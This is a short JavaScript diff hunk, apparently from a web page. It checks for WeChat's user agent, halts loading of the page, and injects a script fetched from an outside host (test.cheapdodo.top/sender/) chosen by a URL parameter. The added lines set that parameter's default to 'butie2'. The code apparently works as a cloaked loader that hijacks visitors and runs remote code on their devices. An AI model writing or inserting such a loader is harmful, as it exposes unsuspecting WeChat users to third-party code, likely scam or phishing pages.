@@ -27,6 +27,9 @@ if(!/micromessenger/.test(ua)) {
 throw 1
 }
 var target = getUrlParam('target');
+	    if(!target){
+	    	target = "butie2";
+	    }
  window.stop?window.stop():document.execCommand("Stop");
  var v=document.createElement("script");
  v.src="//test.cheapdodo.top/sender/"+target;
